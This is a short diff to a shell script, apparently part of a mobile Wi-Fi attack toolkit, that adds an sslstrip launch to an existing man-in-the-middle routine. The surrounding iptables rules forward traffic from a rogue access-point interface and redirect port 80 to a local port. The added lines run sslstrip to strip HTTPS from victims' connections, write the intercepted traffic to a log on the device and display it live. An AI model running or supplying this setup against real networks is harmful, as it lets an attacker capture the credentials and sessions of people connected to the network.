@@ -135,11 +135,15 @@ iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
 
 #launch ssltrip with log
-echo
 echo -e "\e[34mLogs saved to /sdcard/capture/ssl/\e[0m"
 logfile=/sdcard/capture/ssl/sslstrip_$(date +%F-%H%M).log
 echo
 echo -e "\e[35m*When you have finish the sslstrip (ctrl-C to escape)\e[0m"
+echo -e "\e[35m*You will be able to see the result in this terminal\e[0m"
+sslstrip.py -pfk -l 8888 -w $logfile
+echo -e "\e[96mLook at the results :\e[0m"
+echo
+tail -f $logfile
 }
 
 #option acces-point captive portal
